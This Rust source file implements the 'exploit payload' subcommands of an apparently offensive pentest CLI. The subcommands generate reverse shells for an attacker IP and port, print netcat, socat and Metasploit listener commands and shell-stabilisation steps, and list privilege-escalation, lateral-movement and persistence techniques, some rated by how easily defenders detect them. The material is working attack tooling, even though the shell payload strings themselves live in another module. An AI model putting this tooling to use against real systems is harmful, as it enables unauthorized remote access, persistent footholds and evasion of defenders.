/// Exploitation Framework CLI Commands
///
/// ‚ö†Ô∏è AUTHORIZED USE ONLY ‚ö†Ô∏è
///
/// **Works alongside**: Metasploit, LinPEAS, WinPEAS, GTFOBins, CrackMapExec, BloodHound
use crate::cli::commands::{Command, Flag, Route};
use crate::cli::output::Output;
use crate::cli::CliContext;
use crate::modules::exploit::{
    lateral_movement::{LateralMovementScanner, PersistenceMechanism},
    payloads::{PayloadConfig, PayloadGenerator, ShellType},
    privesc::PrivEscScanner,
};

pub struct ExploitCommand;

impl Command for ExploitCommand {
    fn domain(&self) -> &str {
        "exploit"
    }

    fn resource(&self) -> &str {
        "payload"
    }

    fn description(&self) -> &str {
        "Exploitation framework - privilege escalation, payloads, lateral movement"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "privesc",
                summary: "Scan for privilege escalation vectors",
                usage: "rb exploit payload privesc",
            },
            Route {
                verb: "shell",
                summary: "Generate reverse shell payload",
                usage: "rb exploit payload shell --type <shell> --lhost <ip> --lport <port>",
            },
            Route {
                verb: "listener",
                summary: "Generate listener command",
                usage: "rb exploit payload listener --port <port>",
            },
            Route {
                verb: "lateral",
                summary: "Show lateral movement techniques",
                usage: "rb exploit payload lateral [technique]",
            },
            Route {
                verb: "persist",
                summary: "Show persistence mechanisms",
                usage: "rb exploit payload persist [mechanism]",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new(
                "type",
                "Shell type (bash|python|php|powershell|nc|socat|...)",
            )
            .with_short('t')
            .with_default("bash"),
            Flag::new("lhost", "Listener host (attacker IP)")
                .with_short('h')
                .with_arg("IP"),
            Flag::new("lport", "Listener port")
                .with_short('p')
                .with_default("4444"),
            Flag::new("port", "Port for listener").with_default("4444"),
            Flag::new("ssl", "Use SSL/TLS for encrypted shell (socat only)"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Scan for privilege escalation vectors",
                "rb exploit payload privesc",
            ),
            (
                "Generate Python reverse shell",
                "rb exploit payload shell --type python --lhost 10.10.10.10 --lport 4444",
            ),
            (
                "Generate PowerShell reverse shell",
                "rb exploit payload shell --type powershell --lhost 192.168.1.100 --lport 443",
            ),
            (
                "Generate listener command",
                "rb exploit payload listener --port 4444",
            ),
            (
                "Show SSH tunneling techniques",
                "rb exploit payload lateral ssh_tunneling",
            ),
            (
                "Show Linux persistence techniques",
                "rb exploit payload persist cron_persistence",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_ref().ok_or_else(|| {
            "Missing verb. Use: rb exploit payload <verb>\nTry: rb exploit payload help".to_string()
        })?;

        match verb.as_str() {
            "privesc" => self.privesc_scan(ctx),
            "shell" => self.generate_shell(ctx),
            "listener" => self.generate_listener(ctx),
            "lateral" => self.show_lateral_movement(ctx),
            "persist" => self.show_persistence(ctx),
            "help" => {
                crate::cli::commands::print_help(self);
                Ok(())
            }
            _ => Err(format!(
                "Unknown verb '{}'. Use: rb exploit payload help",
                verb
            )),
        }
    }
}

impl ExploitCommand {
    fn privesc_scan(&self, _ctx: &CliContext) -> Result<(), String> {
        Output::header("Privilege Escalation Scanner");

        Output::spinner_start("Scanning for privilege escalation vectors");

        let scanner = PrivEscScanner::new();
        let scan_result = scanner.scan()?;
        let vectors = &scan_result.vectors;

        Output::spinner_done();

        if vectors.is_empty() {
            Output::success("No obvious privilege escalation vectors found.");
            println!("\n  This is a good sign! But always check manually:");
            println!("  ‚Ä¢ LinPEAS: https://github.com/carlospolop/PEASS-ng");
            println!("  ‚Ä¢ WinPEAS: https://github.com/carlospolop/PEASS-ng");
            println!("  ‚Ä¢ GTFOBins: https://gtfobins.github.io/");
            return Ok(());
        }

        Output::success(&format!("Found {} potential vectors", vectors.len()));
        println!();

        // Group by severity
        let critical: Vec<_> = vectors
            .iter()
            .filter(|v| {
                matches!(
                    v.severity,
                    crate::modules::exploit::privesc::Severity::Critical
                )
            })
            .collect();
        let high: Vec<_> = vectors
            .iter()
            .filter(|v| matches!(v.severity, crate::modules::exploit::privesc::Severity::High))
            .collect();
        let medium: Vec<_> = vectors
            .iter()
            .filter(|v| {
                matches!(
                    v.severity,
                    crate::modules::exploit::privesc::Severity::Medium
                )
            })
            .collect();

        if !critical.is_empty() {
            println!(
                "\x1b[1m\x1b[31müî¥ CRITICAL ({} vectors)\x1b[0m",
                critical.len()
            );
            for v in critical {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!("    \x1b[36müí° {}\x1b[0m", v.exploit_technique);
                if !v.references.is_empty() {
                    println!("    üìñ {}", v.references.join(", "));
                }
                println!();
            }
        }

        if !high.is_empty() {
            println!("\x1b[1m\x1b[33müü† HIGH ({} vectors)\x1b[0m", high.len());
            for v in high {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!("    \x1b[36müí° {}\x1b[0m", v.exploit_technique);
                println!();
            }
        }

        if !medium.is_empty() {
            println!("\x1b[1m\x1b[34müîµ MEDIUM ({} vectors)\x1b[0m", medium.len());
            for v in medium {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!();
            }
        }

        println!("\n\x1b[1mNext Steps:\x1b[0m");
        println!("  1. Verify findings manually");
        println!("  2. Check GTFOBins for SUID exploitation");
        println!("  3. Search for kernel exploits: searchsploit <version>");
        println!("  4. Generate payload: rb exploit payload shell --type python --lhost <ip>");

        Ok(())
    }

    fn generate_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "bash");
        let lhost = ctx
            .get_flag("lhost")
            .ok_or("Missing --lhost flag (attacker IP)")?;
        let lport = ctx.get_flag_or("lport", "4444");

        let lport_num: u16 = lport
            .parse()
            .map_err(|_| format!("Invalid port: {}", lport))?;

        Output::header(&format!("Reverse Shell Generator - {}", shell_type));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: lport_num,
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "perl" | "pl" => ShellType::Perl,
            "php" => ShellType::PHP,
            "ruby" | "rb" => ShellType::Ruby,
            "nc" | "netcat" => ShellType::Netcat,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            "socat" => ShellType::Socat,
            "awk" => ShellType::Awk,
            "java" => ShellType::Java,
            "node" | "nodejs" | "js" => ShellType::Node,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available: bash, python, perl, php, ruby, nc, powershell, socat, awk, java, node",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", lhost);
        Output::item("Listener Port", &lport);
        Output::item("Shell Type", &shell_type);

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start Listener:\x1b[0m");
        println!("  nc -lvnp {}", lport);
        println!("  OR");
        println!("  rb exploit payload listener --port {}", lport);

        println!("\n\x1b[1müîß Shell Stabilization (after connection):\x1b[0m");
        println!("  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'");
        println!("  Ctrl+Z (background)");
        println!("  stty raw -echo; fg");
        println!("  export TERM=xterm");

        Ok(())
    }

    fn generate_listener(&self, ctx: &CliContext) -> Result<(), String> {
        let port = ctx.get_flag_or("port", "4444");
        let use_ssl = ctx.has_flag("ssl");

        Output::header("Listener Commands");
        Output::item("Port", &port);

        println!("\n\x1b[1müéß Start Listener:\x1b[0m\n");

        println!("\x1b[1m1. Netcat (Traditional):\x1b[0m");
        println!("   nc -lvnp {}", port);

        println!("\n\x1b[1m2. Netcat (OpenBSD):\x1b[0m");
        println!("   nc -lvp {}", port);

        println!("\n\x1b[1m3. Ncat (Nmap):\x1b[0m");
        println!("   ncat -lvnp {}", port);

        if use_ssl {
            println!("\n\x1b[1m4. Socat with SSL:\x1b[0m");
            println!("   # Generate certificate:");
            println!("   openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt");
            println!("   cat shell.key shell.crt > shell.pem");
            println!("\n   # Start listener:");
            println!(
                "   socat OPENSSL-LISTEN:{},cert=shell.pem,verify=0 STDOUT",
                port
            );
        } else {
            println!("\n\x1b[1m4. Socat:\x1b[0m");
            println!("   socat TCP-LISTEN:{},reuseaddr,fork STDOUT", port);
        }

        println!("\n\x1b[1m5. Metasploit:\x1b[0m");
        println!("   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {}; run\"", port);

        println!("\n\x1b[1m6. PowerShell (Windows):\x1b[0m");
        println!(
            "   $listener = [System.Net.Sockets.TcpListener]{};$listener.start();$client = $listener.AcceptTcpClient();",
            port
        );

        Ok(())
    }

    fn show_lateral_movement(&self, ctx: &CliContext) -> Result<(), String> {
        let technique = ctx.target.as_deref();

        Output::header("Lateral Movement Techniques");

        let commands = LateralMovementScanner::generate_movement_commands();

        if let Some(tech) = technique {
            if let Some(cmd) = commands.get(tech) {
                Output::item("Technique", tech);
                println!("\n{}", cmd);
                return Ok(());
            } else {
                Output::error(&format!("Unknown technique: {}", tech));
                println!("\nAvailable techniques:");
            }
        }

        println!("\n\x1b[1mAvailable Techniques:\x1b[0m\n");

        let techniques = vec![
            ("ssh_key_reuse", "üîë SSH Key Reuse"),
            ("ssh_tunneling", "üåê SSH Tunneling & Port Forwarding"),
            ("psexec", "üíª PsExec (Windows)"),
            ("wmiexec", "‚öôÔ∏è  WMI Execution (Windows)"),
            ("pass_the_hash", "üîê Pass-the-Hash (Windows)"),
            ("smb_relay", "üîÑ SMB Relay Attack"),
            ("nfs_mount", "üìÅ NFS Mount Exploitation"),
            ("rsync_abuse", "üì¶ Rsync Abuse"),
            ("password_spraying", "üåßÔ∏è  Password Spraying"),
            ("metasploit_pivot", "üîÄ Metasploit Pivoting"),
            ("chisel_tunnel", "üîß Chisel Tunneling"),
        ];

        for (key, desc) in techniques {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload lateral {}\x1b[0m\n", key);
        }

        println!("\n\x1b[1mWorks alongside:\x1b[0m");
        println!("  ‚Ä¢ CrackMapExec - Credential spraying");
        println!("  ‚Ä¢ BloodHound - Active Directory enumeration");
        println!("  ‚Ä¢ Impacket - SMB/WMI tools");
        println!("  ‚Ä¢ Metasploit - Pivoting framework");

        Ok(())
    }

    fn show_persistence(&self, ctx: &CliContext) -> Result<(), String> {
        let mechanism = ctx.target.as_deref();

        Output::header("Persistence Mechanisms");

        let commands = PersistenceMechanism::generate_persistence_commands();

        if let Some(mech) = mechanism {
            if let Some(cmd) = commands.get(mech) {
                Output::item("Mechanism", mech);
                println!("\n{}", cmd);
                return Ok(());
            } else {
                Output::error(&format!("Unknown mechanism: {}", mech));
                println!("\nAvailable mechanisms:");
            }
        }

        println!("\n\x1b[1müêß Linux Persistence:\x1b[0m\n");

        let linux_mechanisms = vec![
            ("cron_persistence", "‚è∞ Cron Job Persistence"),
            ("ssh_key_persistence", "üîë SSH Authorized Keys"),
            ("systemd_service", "‚öôÔ∏è  systemd Service"),
            ("bashrc_persistence", "üìù .bashrc/.profile Injection"),
        ];

        for (key, desc) in linux_mechanisms {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload persist {}\x1b[0m\n", key);
        }

        println!("\x1b[1mü™ü Windows Persistence:\x1b[0m\n");

        let windows_mechanisms = vec![
            ("registry_run_key", "üìã Registry Run Keys"),
            ("scheduled_task", "‚è∞ Scheduled Tasks"),
            ("wmi_persistence", "‚öôÔ∏è  WMI Event Subscriptions"),
            ("sticky_keys", "üîê Sticky Keys Backdoor"),
        ];

        for (key, desc) in windows_mechanisms {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload persist {}\x1b[0m\n", key);
        }

        println!("\n\x1b[1m‚ö†Ô∏è  Detection Risk:\x1b[0m");
        println!("  ‚Ä¢ Cron/Scheduled Tasks: MEDIUM (visible in cron/task list)");
        println!("  ‚Ä¢ SSH Keys: LOW (requires checking authorized_keys)");
        println!("  ‚Ä¢ systemd/Registry: MEDIUM (visible in service/registry list)");
        println!("  ‚Ä¢ WMI Subscriptions: HIGH (advanced defenders check WMI)");
        println!("  ‚Ä¢ Sticky Keys: CRITICAL (easily detected, requires reboot)");

        Ok(())
    }
}
